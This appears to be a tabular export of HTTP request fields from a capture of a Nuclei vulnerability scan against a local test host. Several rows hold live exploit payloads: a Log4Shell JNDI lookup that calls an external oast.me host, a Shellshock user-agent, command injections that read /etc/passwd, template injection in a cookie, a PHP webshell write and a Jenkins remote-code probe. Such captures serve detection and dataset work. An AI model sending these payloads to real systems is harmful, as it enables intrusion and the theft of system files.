http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/login/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/login/
	gzip																close		154	154	application/json						192.168.1.104															1	http://192.168.1.104/web/run		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/run
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ReportServer/Pages/ReportViewer.aspx		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/ReportServer/Pages/ReportViewer.aspx
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27
*/*	gzip	en															close		588	588							192.168.1.104															1	http://192.168.1.104/web/node/1?_format=hal_json		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/node/1?_format=hal_json
*/*	gzip	en															close		8004	8004	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData
	gzip																close		106	106	application/x-www-form-urlencoded;charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/guest_auth/guestIsUp.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/guest_auth/guestIsUp.php
	gzip																close		252	252	multipart/form-data; boundary=--------------------------835846770881083140190633						192.168.1.104															1	http://192.168.1.104/web/index.php?s=/home/page/uploadImg		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/index.php?s=/home/page/uploadImg
application/json, text/javascript, */*; q=0.01	gzip																close		265	265	multipart/form-data; boundary=---------------------------5825462663702204104870787337						192.168.1.104															1	http://192.168.1.104/web/dashboard/uploadID.php		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/dashboard/uploadID.php
*/*	gzip	en															close		72	72	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/index.php?s=captcha		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/index.php?s=captcha
*/*	gzip	en															close		51	51							192.168.1.104															1	http://192.168.1.104/web/(download)/tmp/poc.txt		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/(download)/tmp/poc.txt
	gzip																close		7256	7256	application/json						192.168.1.104															1	http://192.168.1.104/web/service/extdirect		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/service/extdirect
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36			CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl	/web
	gzip	${jndi:${lower:d}n${lower:s}://${env:hostName}.c8ach799m8v918fkv9igcekct8ayyyyyc.oast.me}															close										192.168.1.104															1	http://192.168.1.104/web/portal/info.jsp		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/portal/info.jsp
	gzip																close		77	77	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/php/ping.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/php/ping.php
*/*	gzip																close		115	115	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/boardDataWW.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/boardDataWW.php
	gzip																close		169	169	application/x-www-form-urlencoded; charset=utf-8						192.168.1.104															1	http://192.168.1.104/web/console/images/%252e%252e%252fconsole.portal		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/console/images/%252e%252e%252fconsole.portal
*/*	gzip	en															close		1046	1046	text/xml						192.168.1.104															1	http://192.168.1.104/web/wls-wsat/CoordinatorPortType		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/wls-wsat/CoordinatorPortType
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/web.config.i18n.ashx?l=nuclei&v=nuclei		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/web.config.i18n.ashx?l=nuclei&v=nuclei
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20nuclei.txt%60		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20nuclei.txt%60
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ucmdb-api/connect		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/ucmdb-api/connect
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/solr/admin/cores?wt=json		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/solr/admin/cores?wt=json
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/secure/ContactAdministrators!default.jspa		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/secure/ContactAdministrators!default.jspa
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/login/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/login/
*/*	gzip	en															close		101	101							192.168.1.104															1	http://192.168.1.104/web/actions/authenticate.php		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/actions/authenticate.php
	gzip																close		790	790	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/index.htmlr	1	http://192.168.1.104/web/goform/setmac		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/goform/setmac
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/index.php?a=fetch&content=%3C%3Fphp+file_put_contents%28%2225SnEkT2P49VWtBjX7t0PRxInp7.php%22%2C%22%3C%3Fphp+echo+phpinfo%28%29%3B%22%29%3B		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/index.php?a=fetch&content=%3C%3Fphp+file_put_contents%28%2225SnEkT2P49VWtBjX7t0PRxInp7.php%22%2C%22%3C%3Fphp+echo+phpinfo%28%29%3B%22%29%3B
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/pages/systemcall.php?command=cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/pages/systemcall.php?command=cat%20/etc/passwd
application/json	gzip																close		307	307	application/json						192.168.1.104															1	http://192.168.1.104/web/_ignition/execute-solution		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/_ignition/execute-solution
*/*	gzip	en															close		22	22	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/website/blog/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/website/blog/
*/*	gzip	en															close		369	369	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/_search?pretty		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/_search?pretty
*/*	gzip																close		736	736	multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb						192.168.1.104															1	http://192.168.1.104/web/lib/crud/userprocess.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36			PHPSESSID=25SnEndwruRx1e3JIBWyyiT11TU	/web/lib/crud/userprocess.php
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/slogin/login.py		GET				HTTP/1.1																			() { :; }; echo ; echo ; /bin/cat /etc/passwd				/web/cgi-bin/slogin/login.py
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;/root/kerbynet.cgi/scripts/getkey%20../../../etc/passwd;%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;/root/kerbynet.cgi/scripts/getkey%20../../../etc/passwd;%22
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/nuclei.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/nuclei.txt
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web		OPTIONS				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/
*/*	gzip, deflate																close		160	160	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/javax.faces.resource/dynamiccontent.properties.xhtml		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/javax.faces.resource/dynamiccontent.properties.xhtml
	gzip																close		360	360	text/xml						192.168.1.104															1	http://192.168.1.104/web/web/cobbler_api		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/web/cobbler_api
	gzip																close		1047	1047	multipart/form-data; boundary=8b1ab266c41afb773af2e064bc526458						192.168.1.104															1	http://192.168.1.104/web/./RestAPI/LogonCustomization		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/./RestAPI/LogonCustomization
